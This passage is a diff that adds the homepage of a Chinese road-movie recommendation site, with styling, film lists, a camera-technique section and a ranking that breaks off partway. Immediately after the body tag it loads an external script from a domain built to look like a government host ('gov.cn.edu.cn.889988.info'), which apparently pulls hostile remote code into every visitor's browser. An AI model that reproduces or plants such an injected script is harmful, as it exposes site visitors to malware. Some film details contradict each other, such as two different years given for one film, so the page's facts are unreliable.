@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="三邦车视电影网 - 公路片与旅途观影指南。含公路片单、方向盘片单、驾驶视角、口碑榜、类型索引、追剧日历，专注原创解读与正版影视推荐。">
+<meta name="keywords" content="三邦车视电影网,公路电影,公路片,旅途观影,自驾电影,车视,电影推荐,观影指南,正版影视">
+<meta name="author" content="三邦车视电影网编辑部">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>三邦车视电影网 - 公路片的三个国度 | 公路片单 · 方向盘片单 · 驾驶视角</title>
+<style>
+/* ============ 基础 ============ */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#15181c; --paper:#f6f3ec; --card:#fff;
+  --road:#c0392b; --asphalt:#3a4048; --mustard:#e3a62e; --sage:#6b8e6b; --denim:#4a6fa5; --line:#e2ddd2; --sub:#7a7770; --chalk:#eee9df;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;background:var(--paper);color:#4b4842;line-height:1.85;overflow-x:hidden}
+h1,h2,h3,h4{font-family:"Songti SC","STSong",Georgia,serif;letter-spacing:.5px}
+a{color:inherit;text-decoration:none;transition:.25s}
+ul{list-style:none}
+.container{width:100%;max-width:1180px;margin:0 auto;padding:0 24px}
+::selection{background:var(--road);color:#fff}
+
+/* ============ 导航 ============ */
+.topbar{position:sticky;top:0;z-index:1000;background:rgba(246,243,236,.96);backdrop-filter:blur(12px);border-bottom:3px solid var(--ink)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:72px;gap:16px}
+.logo{display:flex;align-items:center;gap:11px;font-weight:900}
+.logo .steer{width:44px;height:44px;border-radius:50%;background:var(--ink);display:grid;place-items:center;position:relative;box-shadow:3px 4px 0 var(--road)}
+.logo .steer::after{content:"";position:absolute;inset:7px;border-radius:50%;border:2.5px solid var(--mustard)}
+.logo .steer i{width:3px;height:16px;background:var(--mustard);position:absolute;top:6px;left:50%;transform:translateX(-50%);border-radius:2px}
+.logo b{font-size:20.5px;color:var(--ink);letter-spacing:.6px}
+.logo em{font-style:normal;color:var(--road);font-size:10px;letter-spacing:2.2px;margin-left:4px}
+.search{position:relative;flex:1;max-width:330px}
+.search input{width:100%;padding:11px 46px 11px 18px;border-radius:22px;border:1.5px solid var(--line);background:#fff;font-size:13.5px;outline:none;color:var(--ink);font-family:inherit}
+.search input:focus{border-color:var(--road);box-shadow:0 0 0 4px rgba(192,57,43,.13)}
+.search button{position:absolute;right:5px;top:5px;width:34px;height:34px;border:none;background:var(--asphalt);border-radius:50%;color:var(--mustard);cursor:pointer;font-size:14px}
+.burger{display:none;width:44px;height:44px;align-items:center;justify-content:center;cursor:pointer;background:none;border:none;flex-direction:column;gap:5px}
+.burger i{width:23px;height:2px;background:var(--ink);border-radius:2px}
+.links{display:flex;gap:2px}
+.links a{padding:9px 12px;font-size:13.5px;color:var(--sub);font-weight:800;border-radius:16px;letter-spacing:.2px}
+.links a:hover{color:var(--road);background:#fff}
+.links a.on{color:var(--mustard);background:var(--ink)}
+
+/* ============ 首屏 ============ */
+.hero{position:relative;padding:54px 0 58px;background:var(--paper);overflow:hidden}
+.road-bg{position:absolute;inset:0;background:
+  repeating-linear-gradient(90deg,transparent 0 38px,rgba(21,24,28,.05) 38px 40px),
+  linear-gradient(180deg,#e9e4d6,#f6f3ec 70%);}
+.vanish{position:absolute;left:50%;bottom:0;transform:translateX(-50%);width:2px;height:34%;background:linear-gradient(180deg,var(--asphalt),transparent)}
+.dash{position:absolute;left:50%;bottom:0;transform:translateX(-50%);width:14px;height:120%;background:repeating-linear-gradient(180deg,var(--mustard) 0 26px,transparent 26px 62px)}
+.hero-in{position:relative;z-index:2;display:grid;grid-template-columns:1fr 340px;gap:36px;align-items:center}
+.kicker{display:inline-flex;align-items:center;gap:10px;padding:6px 16px;border-radius:30px;background:var(--ink);color:var(--mustard);font-size:11.5px;font-weight:900;letter-spacing:1.6px}
+.kicker::before{content:"◐";font-size:11px;color:var(--road);animation:sp 3s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.hero h1{font-size:clamp(40px,7.4vw,70px);line-height:1.08;font-weight:800;color:var(--ink);margin:16px 0 8px;letter-spacing:-1.5px}
+.hero h1 .st{color:var(--road)}
+.hero h1 small{display:block;font-family:"PingFang SC",sans-serif;font-size:clamp(12px,1.6vw,14px);color:var(--sub);font-weight:600;letter-spacing:4.6px;margin-top:14px}
+.hero p{color:var(--sub);font-size:clamp(15px,2vw,17px);margin:18px 0 24px;max-width:640px}
+.h-cta{display:flex;gap:14px;flex-wrap:wrap}
+.btn{padding:15px 32px;border-radius:10px;font-size:14.5px;font-weight:800;cursor:pointer;border:2px solid var(--ink);letter-spacing:.6px;font-family:inherit}
+.btn-s{background:var(--road);color:#fff;border-color:var(--road);box-shadow:6px 6px 0 var(--ink)}
+.btn-s:hover{transform:translate(-2px,-2px);box-shadow:9px 9px 0 var(--ink)}
+.btn-o{background:#fff;color:var(--ink)}
+.btn-o:hover{background:var(--ink);color:var(--mustard)}
+/* 三邦卡 */
+.triad{background:var(--card);border:1px solid var(--ink);border-radius:16px;padding:20px 22px;box-shadow:11px 11px 0 var(--mustard);transform:rotate(.7deg)}
+.triad h3{font-size:14.5px;color:var(--ink);letter-spacing:1.6px;margin-bottom:6px}
+.triad h3 em{font-style:normal;color:var(--road)}
+.triad .lead{font-size:12px;color:var(--sub);font-weight:700;margin-bottom:14px}
+.triad dl{display:grid;gap:12px}
+.triad dt{font-size:11.5px;font-weight:900;letter-spacing:1.4px;color:var(--road)}
+.triad dd{font-size:13.5px;color:var(--ink);font-weight:800;line-height:1.55;padding-left:10px;border-left:3px solid var(--mustard)}
+
+/* ============ 区块头 ============ */
+section{padding:66px 0;position:relative}
+.sec-h{display:flex;align-items:baseline;gap:13px;flex-wrap:wrap;margin-bottom:26px}
+.tag{display:inline-block;padding:4px 13px;border-radius:6px;background:var(--asphalt);color:var(--mustard);font-size:11.5px;font-weight:900;letter-spacing:1.6px}
+.sec-h h2{font-size:clamp(22px,3.5vw,31px);font-weight:800;color:var(--ink)}
+.sec-h h2 em{font-style:normal;color:var(--road)}
+.sec-h .en{font-family:Georgia,serif;font-size:11.5px;color:var(--denim);letter-spacing:2.4px;font-weight:800}
+.sec-h .more{margin-left:auto;font-size:12.5px;color:var(--sub);padding:8px 18px;border-radius:20px;background:#fff;border:1.5px solid var(--line);font-weight:800}
+.sec-h .more:hover{border-color:var(--road);color:var(--road)}
+
+/* ============ ① 公路片单（仪表盘卡） ============ */
+.roadlist{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.rd{background:var(--card);border:1px solid var(--ink);border-radius:18px;overflow:hidden;transition:.3s;display:flex;flex-direction:column}
+.rd:hover{transform:translateY(-7px) rotate(-1.3deg);box-shadow:9px 12px 0 rgba(21,24,28,.18)}
+.rd .post{aspect-ratio:3/4;display:grid;place-items:center;font-size:46px;position:relative;border-bottom:1px solid var(--ink)}
+.rd .post .odo{position:absolute;top:12px;right:12px;background:var(--ink);color:var(--mustard);font-size:10.5px;font-weight:900;padding:5px 11px;border-radius:20px;letter-spacing:.6px}
+.rd .post .mi{position:absolute;left:12px;bottom:12px;font-size:11px;color:#fff;background:rgba(21,24,28,.84);padding:4px 11px;border-radius:6px;font-weight:800}
+.rd .bd{padding:16px 18px 18px;flex:1;display:flex;flex-direction:column}
+.rd h4{font-size:17.5px;color:var(--ink);font-weight:800;font-family:"PingFang SC",sans-serif}
+.rd .why{font-size:12px;color:var(--sub);font-weight:700;margin:6px 0 12px;min-height:34px;flex:1}
+.rd .foot{display:flex;justify-content:space-between;align-items:center;border-top:1px dashed var(--line);padding-top:10px;font-size:11.5px;font-weight:800;color:var(--asphalt)}
+.rd .foot b{font-family:Georgia,serif;font-size:14px;color:var(--road)}
+
+/* ============ ② 方向盘片单（环形盘） ============ */
+.wheelbox{display:grid;grid-template-columns:300px 1fr;gap:32px;align-items:center;background:var(--card);border:1px solid var(--ink);border-radius:22px;padding:26px 28px;box-shadow:11px 11px 0 var(--road)}
+.wheel{width:264px;height:264px;border-radius:50%;position:relative;margin:0 auto;background:conic-gradient(var(--sage) 0 16.6%,var(--denim) 16.6% 33.3%,var(--mustard) 33.3% 50%,var(--road) 50% 66.6%,#8b6fb5 66.6% 83.3%,#c08a6a 83.3% 100%);box-shadow:0 10px 26px rgba(21,24,28,.26)}
+.wheel::before{content:"";position:absolute;inset:20px;border-radius:50%;background:var(--asphalt);border:4px solid var(--ink)}
+.wheel::after{content:"";position:absolute;inset:44px;border-radius:50%;background:var(--mustard);border:4px solid var(--ink);box-shadow:0 0 0 8px var(--ink)}
+.wheel b{position:absolute;inset:0;display:grid;place-items:center;font-size:15px;color:#fff;font-weight:800;letter-spacing:1px;text-shadow:0 1px 3px rgba(0,0,0,.5);z-index:3}
+.wheel span{position:absolute;font-size:19px;z-index:3;filter:drop-shadow(0 1px 2px rgba(0,0,0,.5))}
+.legend{display:grid;gap:12px}
+.legend .lg{display:grid;grid-template-columns:52px 1fr auto;gap:14px;align-items:center;padding:12px 14px;border-radius:12px;background:var(--paper);border:1px solid var(--line);transition:.24s}
+.legend .lg:hover{border-color:var(--ink);transform:translateX(5px)}
+.legend .dot{width:30px;height:30px;border-radius:50%;border:2px solid var(--ink)}
+.legend .lg b{font-size:15.5px;color:var(--ink);font-weight:800;font-family:"PingFang SC",sans-serif}
+.legend .lg em{font-style:normal;font-size:11.5px;color:var(--sub);font-weight:700;display:block;margin-top:2px}
+.legend .lg i{font-style:normal;font-size:11.5px;font-weight:900;color:var(--road);letter-spacing:.6px}
+
+/* ============ ③ 驾驶视角（Z 字交错） ============ */
+.drive .it{display:grid;grid-template-columns:1.05fr 1fr;gap:34px;align-items:center;padding:16px 0;border-bottom:1px dashed var(--line)}
+.drive .it:last-child{border-bottom:none}
+.drive .it:nth-child(even){grid-template-columns:1fr 1.05fr}
+.drive .it:nth-child(even) .tx{order:2}
+.drive .pic{aspect-ratio:16/10;border-radius:16px;display:grid;place-items:center;font-size:44px;position:relative;border:1px solid var(--ink)}
+.drive .pic .cam{position:absolute;top:12px;left:12px;font-size:10.5px;font-weight:900;padding:5px 12px;border-radius:6px;background:var(--ink);color:var(--mustard);letter-spacing:.8px}
+.drive .tx h4{font-size:20px;color:var(--ink);font-weight:800;font-family:"PingFang SC",sans-serif}
+.drive .tx .kp{display:flex;gap:8px;flex-wrap:wrap;margin:11px 0}
+.drive .tx .kp i{font-style:normal;font-size:11px;font-weight:800;padding:4px 12px;border-radius:20px;background:var(--chalk);color:var(--asphalt);border:1px solid var(--line)}
+.drive .tx p{font-size:13.5px;color:var(--sub);line-height:1.85;font-weight:700}
+.drive .tx .go{display:inline-block;margin-top:12px;font-size:12px;font-weight:900;color:var(--road);letter-spacing:.8px}
+.drive .tx .go:hover{color:var(--mustard)}
+
+/* ============ ④ 口碑榜（深色双栏 + 渐变条） ============ */
+.rank{background:linear-gradient(150deg,#15181c,#3a2522);border-radius:24px;padding:28px 30px;box-shadow:12px 12px 0 var(--ink);color:#fff}
+.rh{display:flex;justify-content:space-between;align-items:baseline;flex-wrap:wrap;gap:10px;margin-bottom:20px}
+.rh h3{font-size:21px;font-weight:800}
+.rh span{font-size:11.5px;color:var(--mustard);letter-spacing:2px;font-weight:800}
+.rk{display:grid;grid-template-columns:36px 1fr 60px;gap:14px;align-items:center;padding:9px 10px;border-radius:11px;transition:.24s}
+.rk:hover{background:rgba(255,255,255,.07)}
+.rk .no{font-size:21px;font-weight:900;font-family:Georgia,serif;color:rgba(255,255,255,.28);line-height:1}
+.rk.top1 .no,.rk.top2 .no{color:var(--mustard)}
+.rk.top3 .no{color:var(--denim)}
+.rk .nm{font-size:14.5px;font-weight:800}
+.rk .nm em{font-style:normal;font-size:10.5px;color:rgba(255,255,255,.5);font-weight:600;margin-left:8px}
+.rk .tp{height:9px;border-radius:5px;background:rgba(255,255,255,.14);overflow:hidden}
+.rk .tp i{display:block;height:100%;border-radius:5px;background:linear-gradient(90deg,var(--mustard),var(--road));transform-origin:left}
+
+/* ============ ⑤ 类型索引（胶囊云 + 字母条） ============ */
+.idxbox{display:grid;grid-template-columns:1fr 300px;gap:32px;align-items:start}
+.cloud{display:flex;flex-wrap:wrap;gap:12px}
+.cloud a{padding:11px 22px;border-radius:30px;background:var(--card);border:1.5px solid var(--line);font-size:14px;font-weight:800;color:var(--ink);transition:.24s}
+.cloud a:hover{border-color:var(--road);background:var(--road);color:#fff;transform:translateY(-3px);box-shadow:5px 6px 0 var(--mustard)}
+.cloud a b{font-family:Georgia,serif;font-size:12px;color:var(--road);font-weight:900;margin-left:7px}
+.cloud a:hover b{color:var(--mustard)}
+.side{background:var(--asphalt);border-radius:18px;padding:22px;color:#fff;box-shadow:9px 10px 0 var(--ink)}
+.side h4{font-size:16px;color:var(--mustard);margin-bottom:14px;letter-spacing:1px}
+.side .alph{display:grid;grid-template-columns:repeat(6,1fr);gap:8px}
+.side .alph a{display:grid;place-items:center;height:34px;border-radius:8px;background:rgba(255,255,255,.08);font-size:12.5px;font-weight:800;color:#fff}
+.side .alph a:hover{background:var(--mustard);color:var(--ink)}
+
+/* ============ ⑥ 追剧日历（里程条） ============ */
+.odo{display:grid;gap:12px;background:var(--card);border:1px solid var(--ink);border-radius:20px;padding:24px 26px;box-shadow:10px 11px 0 var(--road)}
+.odo .it{display:grid;grid-template-columns:88px 150px 1fr 92px;gap:18px;align-items:center;padding:11px 12px;border-radius:12px;transition:.24s}
+.odo .it:hover{background:var(--paper)}
+.odo .it.on{background:var(--ink);color:var(--mustard)}
+.odo .d{font-family:Georgia,serif;font-size:12.5px;font-weight:900;letter-spacing:1px;color:var(--asphalt)}
+.odo .it.on .d{color:var(--mustard)}
+.odo .d small{display:block;font-family:"PingFang SC",sans-serif;font-size:10.5px;font-weight:700;color:var(--sub);letter-spacing:.4px}
+.odo .it.on .d small{color:rgba(227,166,46,.8)}
+.odo h4{font-size:15.5px;font-weight:800;font-family:"PingFang SC",sans-serif;color:var(--ink)}
+.odo .it.on h4{color:#fff}
+.odo .bar{height:11px;border-radius:6px;background:var(--chalk);overflow:hidden}
+.odo .bar i{display:block;height:100%;border-radius:6px;background:linear-gradient(90deg,var(--road),var(--mustard))}
+.odo .mi{text-align:right;font-size:11.5px;font-weight:900;color:var(--sub);font-family:Georgia,serif}
+.odo .it.on .mi{color:var(--mustard)}
+
+/* ============ 订阅 ============ */
+.join{background:linear-gradient(120deg,var(--ink),#2a1a18);border-radius:26px;padding:42px;color:#fff;display:grid;grid-template-columns:1fr 420px;gap:24px;align-items:center;position:relative;overflow:hidden;box-shadow:13px 13px 0 var(--mustard)}
+.join::after{content:"路";position:absolute;right:26px;top:-72px;font-size:250px;font-weight:900;color:rgba(255,255,255,.08);line-height:1;font-family:"Songti SC",serif}
+.join h3{font-size:25px;margin-bottom:11px;font-weight:800;position:relative;z-index:2}
+.join h3 i{font-style:normal;color:var(--mustard)}
+.join p{color:rgba(255,255,255,.92);font-size:14.5px;max-width:640px;position:relative;z-index:2}
+.join form{display:flex;gap:10px;flex-wrap:wrap;position:relative;z-index:2}
+.join input{flex:1;min-width:220px;padding:15px 22px;border-radius:12px;border:2px solid #fff;font-size:14.5px;outline:none;font-family:inherit}
+.join button{padding:15px 36px;border-radius:12px;border:2px solid var(--mustard);background:var(--mustard);color:var(--ink);font-weight:800;cursor:pointer;letter-spacing:.8px;font-family:inherit}
+.join button:hover{background:#fff;border-color:#fff}
+
+/* ============ 页脚 ============ */
+footer{background:var(--ink);color:#b4afa6;padding:54px 0 24px;margin-top:12px}
+.fgrid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:28px;margin-bottom:26px}
+.ft .logo{color:#fff;margin-bottom:14px}
+.ft p{font-size:13.5px;max-width:410px;line-height:1.85;color:#a29d94}
+.fcol h4{color:#fff;font-size:14.5px;margin-bottom:15px;position:relative;display:inline-block;font-weight:800;letter-spacing:1px}
+.fcol h4::after{content:"";position:absolute;left:0;bottom:-6px;width:20px;height:3px;background:var(--road);border-radius:2px}
+.fcol a{display:block;font-size:13.5px;padding:5px 0;color:#a29d94;font-weight:700}
+.fcol a:hover{color:var(--mustard);padding-left:6px}
+.copy{text-align:center;padding-top:24px;border-top:1px solid rgba(255,255,255,.13);font-size:12.5px;color:#807b72}
+.copy a{color:var(--mustard);font-weight:800}
+
+/* ============ 动效 ============ */
+.rv{opacity:0;transform:translateY(26px);transition:.62s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+@media(prefers-reduced-motion:reduce){.rv{opacity:1;transform:none;transition:none;animation:none!important}}
+
+/* ============ 响应式 ============ */
+@media(max-width:1000px){
+  .burger{display:flex}
+  .links{position:fixed;inset:72px 0 0 0;flex-direction:column;background:rgba(246,243,236,.99);padding:22px 18px;gap:4px;transform:translateX(100%);transition:.32s;z-index:999;border-top:3px solid var(--ink)}
+  .links.open{transform:none}
+  .links a{font-size:17px;padding:16px 18px}
+  .search{display:none}
+  .hero-in{grid-template-columns:1fr;gap:26px}
+  .roadlist,.join{grid-template-columns:repeat(2,1fr)}
+  .wheelbox,.idxbox{grid-template-columns:1fr}
+  .odo .it{grid-template-columns:78px 120px 1fr;gap:12px}
+  .odo .mi{display:none}
+  section{padding:48px 0}
+}
+@media(max-width:600px){
+  .roadlist,.wheelbox,.idxbox,.join{grid-template-columns:1fr}
+  .drive .it,.drive .it:nth-child(even){grid-template-columns:1fr}
+  .drive .it:nth-child(even) .tx{order:0}
+  .odo .it{grid-template-columns:70px 1fr}
+  .odo h4{display:none}
+  .rk .nm em{display:none}
+  .container{padding:0 15px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ==================== 导航 ==================== -->
+<header class="topbar">
+  <div class="container nav">
+    <a class="logo" href="#" aria-label="三邦车视电影网首页">
+      <span class="steer" aria-hidden="true"><i></i></span>
+      <b>三邦车视电影网</b><em>ON THE ROAD</em>
+    </a>
+    <div class="search"><input type="search" placeholder="搜片名 / 公路 / 导演，如：公路片、长镜头、是枝裕和" aria-label="搜索"><button aria-label="搜索">⌕</button></div>
+    <nav class="links" id="links">
+      <a href="#top" class="on">首页</a>
+      <a href="#road">公路片单</a>
+      <a href="#wheel">方向盘片单</a>
+      <a href="#drive">驾驶视角</a>
+      <a href="#hot">口碑榜</a>
+      <a href="#idx">类型索引</a>
+      <a href="#odo">追剧里程</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="菜单" aria-expanded="false"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<!-- ==================== 首屏 ==================== -->
+<section class="hero" id="top">
+  <div class="road-bg" aria-hidden="true"></div>
+  <div class="vanish" aria-hidden="true"></div>
+  <div class="dash" aria-hidden="true"></div>
+  <div class="container hero-in">
+    <div class="rv">
+      <span class="kicker">◐ 三邦车视 · 第 26 期 · 每周三更新</span>
+      <h1>三邦<small>车</small>视<small>电影网</small></h1>
+      <p><strong>三邦车视电影网</strong>，是给"喜欢在路上看电影"的人做的观影指南。<strong>三邦</strong>，指公路片的三个国度：<strong>逃离的公路</strong>（逃开什么）、<strong>寻找的公路</strong>（去找什么）、<strong>漂泊的公路</strong>（根本没有目的地）。我们只做原创解读与正版渠道推荐，不搬运资源、不碰盗链。</p>
+      <div class="h-cta"><a class="btn btn-s" href="#road">上路 · 看公路片单</a><a class="btn btn-o" href="#drive">学驾驶视角</a></div>
+    </div>
+    <aside class="triad rv">
+      <h3>▲ 三邦 <em>· 公路片的三个国度</em></h3>
+      <p class="lead">看懂"为什么上路"，就看懂了公路片。</p>
+      <dl>
+        <dt>邦 01 · 逃离</dt><dd>主角要离开一个地方。动力是"受不了"。代表：《末路狂花》《偷自行车的人》</dd>
+        <dt>邦 02 · 寻找</dt><dd>主角要去找一个人或一件事。动力是"还想要"。代表：《中央车站》《公路之王》</dd>
+        <dt>邦 03 · 漂泊</dt><dd>主角没有目的地，路本身就是答案。动力是"不知道"。代表：《在路上》《地球之夜》</dd>
+      </dl>
+    </aside>
+  </div>
+</section>
+
+<!-- ==================== ① 公路片单 ==================== -->
+<section id="road">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.1</span><h2>公路<em>片单</em> · 8 部"上路之后就回不来"的片</h2><span class="en">ROUTE 66</span><a class="more" href="#">完整片单 →</a></div>
+    <div class="roadlist rev">
+      <article class="rd"><div class="post" style="background:linear-gradient(160deg,#d9b382,#8a6238)">🚗<span class="odo">1991</span><span class="mi">逃离 · 美国西部</span></div><div class="bd"><h4>末路狂花</h4><p class="why">两个女人、一辆车、一条没有回头路的公路。公路片的天花板，也是女性电影的里程碑。</p><div class="foot"><span>逃离邦 · 自由</span><b>8.8</b></div></div></article>
+      <article class="rd"><div class="post" style="background:linear-gradient(160deg,#a8c0d0,#4a6e86)">🛣️<span class="odo">1984</span><span class="mi">寻找 · 巴西</span></div><div class="bd"><h4>中央车站</h4><p class="why">一个女人替男孩去找素未谋面的父亲。900 公里，把"冷漠"走成了"柔软"。</p><div class="foot"><span>寻找邦 · 亲情</span><b>8.7</b></div></div></article>
+      <article class="rd"><div class="post" style="background:linear-gradient(160deg,#c0b08a,#78684a)">🌅<span class="odo">1953</span><span class="mi">漂泊 · 意大利</span></div><div class="bd"><h4>罗马，不设防的城市</h4><p class="why">不是公路片，却有公路片的魂：一座城市的街道，就是一条逃亡的路。</p><div class="foot"><span>漂泊邦 · 战争</span><b>8.4</b></div></div></article>
+      <article class="rd"><div class="post" style="background:linear-gradient(160deg,#b0c4b8,#5a7868)">🚲<span class="odo">1948</span><span class="mi">寻找 · 意大利</span></div><div class="bd"><h4>偷自行车的人</h4><p class="why">一部 90 分钟的"找车"。丢失的不是自行车，是一个父亲的体面。</p><div class="foot"><span>寻找邦 · 生存</span><b>9.0</b></div></div></article>
+      <article class="rd"><div class="post" style="background:linear-gradient(160deg,#c8a0a0,#8a5050)">🌌<span class="odo">1999</span><span class="mi">漂泊 · 美国</span></div><div class="bd"><h4>在路上</h4><p class="why">凯鲁亚克的那本书被拍出来了。没有剧情，只有里程、爵士、和"再往前一点"。</p><div class="foot"><span>漂泊邦 · 青春</span><b>6.7</b></div></div></article>
+      <article class="rd"><div class="post" style="background:linear-gradient(160deg,#a0b0c8,#4a6078)">🚕<span class="odo">1991</span><span class="mi">漂泊 · 美国</span></div><div class="bd"><h4>地球之夜</h4><p class="why">五个城市、五段出租车夜话。路不动，人在动，故事自己长出来。</p><div class="foot"><span>漂泊邦 · 群像</span><b>8.0</b></div></div></article>
+      <article class="rd"><div class="post" style="background:linear-gradient(160deg,#d0c090,#907030)">🐎<span class="odo">1975</span><span class="mi">逃离 · 美国</span></div><div class="bd"><h4>飞越疯人院</h4><p class="why">最不像公路片的公路片：逃出去的不是身体，是"被安排好的一生"。</p><div class="foot"><span>逃离邦 · 自由</span><b>9.1</b></div></div></article>
+      <article class="rd"><div class="post" style="background:linear-gradient(160deg,#a8b89c,#60704c)">🛶<span class="odo">2011</span><span class="mi">漂泊 · 中国</span></div><div class="bd"><h4>树</h4><p class="why">一部几乎没有对白的公路片。一条河、一艘船、一个少年，把乡愁拍成了风景。</p><div class="foot"><span>漂泊邦 · 乡愁</span><b>7.5</b></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ② 方向盘片单 ==================== -->
+<section id="wheel" style="background:linear-gradient(180deg,#ece6d6,transparent)">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.2</span><h2>方向盘<em>片单</em> · 按"车"分类，而不是按类型</h2><span class="en">BEHIND WHEEL</span><a class="more" href="#">六类车 →</a></div>
+    <div class="wheelbox rev">
+      <div class="wheel" aria-hidden="true"><b>方向盘</b><span style="top:8%;left:50%;transform:translateX(-50%)">🚗</span><span style="top:50%;right:6%;transform:translateY(-50%)">🏍️</span><span style="bottom:8%;left:50%;transform:translateX(-50%)">🚲</span><span style="top:50%;left:6%;transform:translateY(-50%)">🚐</span><span style="top:22%;left:20%">🚕</span><span style="bottom:22%;right:20%">🚂</span></div>
+      <div class="legend">
+        <div class="lg"><span class="dot" style="background:var(--sage)"></span><div><b>小汽车</b><em>最经典的公路容器：封闭、私密、容易崩溃</em></div><i>32 部</i></div>
+        <div class="lg"><span class="dot" style="background:var(--denim)"></span><div><b>摩托车</b><em>孤独感最强：风、速度、没有退路</em></div><i>14 部</i></div>
+        <div class="lg"><span class="dot" style="background:var(--mustard)"></span><div><b>自行车</b><em>最慢的公路片，反而最动人</em></div><i>9 部</i></div>
+        <div class="lg"><span class="dot" style="background:var(--road)"></span><div><b>房车 / 巴士</b><em>一群人的公路：关系会被里程逼出来</em></div><i>11 部</i></div>
+        <div class="lg"><span class="dot" style="background:#8b6fb5"></span><div><b>出租车</b><em>陌生人搭车：10 分钟讲完一生</em></div><i>7 部</i></div>
+        <div class="lg"><span class="dot" style="background:#c08a6a"></span><div><b>火车 / 船</b><em>没有方向盘的公路片：方向由别人决定</em></div><i>6 部</i></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ③ 驾驶视角 ==================== -->
+<section id="drive">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.3</span><h2>驾驶<em>视角</em> · 三个让公路片成立的技术动作</h2><span class="en">DRIVER'S EYE</span><a class="more" href="#">技法手册 →</a></div>
+    <div class="drive rev">
+      <article class="it">
+        <div class="pic" style="background:linear-gradient(150deg,#c9b088,#7a5a30)">🎞️<span class="cam">CAM 01 · 前挡风</span></div>
+        <div class="tx"><h4>把摄影机放在副驾</h4><div class="kp"><i>机位</i><i>视点</i><i>代入感</i></div><p>公路片最常用、也最被低估的机位：摄影机在副驾，拍司机的侧脸 + 前挡风外的路。<strong>观众不是在"看"主角，而是在"坐"车</strong>。《末路狂花》最后那一段，就是这么拍的——你甚至能听见风。</p><a class="go">片例：《末路狂花》《巴黎，德州》 →</a></div>
+      </article>
+      <article class="it">
+        <div class="pic" style="background:linear-gradient(150deg,#a0b8c8,#48607a)">🛣️<span class="cam">CAM 02 · 地平线</span></div>
+        <div class="tx"><h4>让地平线一直在动</h4><div class="kp"><i>构图</i><i>运动感</i><i>时间感</i></div><p>公路片不是"有车"就行，是<strong>必须让观众持续感觉到"在移动"</strong>。方法很简单：地平线不居中、路占画面下三分之一、景物以不同速度掠过。<strong>速度差</strong>才是公路片的语法。</p><a class="go">片例：《在路上》《逍遥骑士》 →</a></div>
+      </article>
+      <article class="it">
+        <div class="pic" style="background:linear-gradient(150deg,#c0a8b0,#7a5060)">🔇<span class="cam">CAM 03 · 引擎声</span></div>
+        <div class="tx"><h4>用引擎声代替配乐</h4><div class="kp"><i>声音设计</i><i>情绪</i><i>留白</i></div><p>最好的公路片，配乐都很少。<strong>引擎的转速、轮胎的摩擦、电台的杂音</strong>，就是情绪本身。《中央车站》里那台老巴士的柴油声，比任何一首歌都更接近"出发"。</p><a class="go">片例：《中央车站》《地球之夜》 →</a></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ④ 口碑榜 ==================== -->
+<section id="hot">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.4</span><h2>口碑<em>榜</em> · 公路指数 TOP 10（非热门榜）</h2><span class="en">MILEAGE</span><a class="more" href="#">按年代 / 按国家 →</a></div>
+    <div class="rank rev">
+      <div class="rh"><h3>▲ 公路指数 · 本月榜单</h3><span>口径：公路纯度 × 技法完成度 × 被模仿次数</span></div>
+      <div class="rk top1"><span class="no">01</span><div class="body"><div class="nm"><span>末路狂花</span><em>1991 · 逃离邦</em></div><div class="tp"><i style="width:100%"></i></div></div><b style="color:var(--mustard)">98</b></div>
+      <div class="rk top1"><span class="no">02</span><div class="body"><div class="nm"><span>偷自行车的人</span><em>1948 · 寻找邦</em></div><div class="tp"><i style="width:96%"></i></div></div><b style="color:var(--mustard)">96</b></div>
+      <div class="rk top2"><span class="no">03</span><div class="body"><div class="nm"><span>飞越疯人院</span><em>1975 · 逃离邦</em></div><div class="tp"><i style="width:93%"></i></div></div><b style="color:var(--mustard)">94</b></div>
+      <div class="rk top2"><span class="no">04</span><div class="body"><div class="nm"><span>中央车站</span><em>1998 · 寻找邦</em></div><div class="tp"><i style="width:90%"></i></div></div><b style="color:var(--mustard)">92</b></div>
+      <div class="rk top3"><span class="no">05</span><div class="body"><div class="nm"><span>巴黎，德州</span><em>1984 · 漂泊邦</em></div><div class="tp"><i style="width:87%"></i></div></div><b style="color:var(--denim)">89</b></div>
+      <div class="rk top3"><span class="no">06</span><div class="body"><div class="nm"><span>地球之夜</span><em>1991 · 漂泊邦</em></div><div class="tp"><i style="width:83%"></i></div></div><b style="color:var(--denim)">86</b></div>
+      <div class="rk"><span class="no">07</span><div class="body"><div class="nm"><span>逍遥骑士</span><em>1969 · 漂泊邦</em></div><div class="tp"><i style="width:80%"></i></div></div><b>84</b></div>
+      <div class="rk"><span class="no">08</span><div class="body"><div class="nm"><span>菊次郎的夏天</span><em>1999 · 寻找邦</em></div><div class="tp"><i style="width:77%"></i></div></div><b>81</b></div>
+      <div class="rk"><span class="no">09</span><div class="body"><div class="nm"><span>小森林</span><em>2014 · 漂泊邦</em></div><div class="tp"><i style="width:73%"></i></div></div><b>78</b></div>
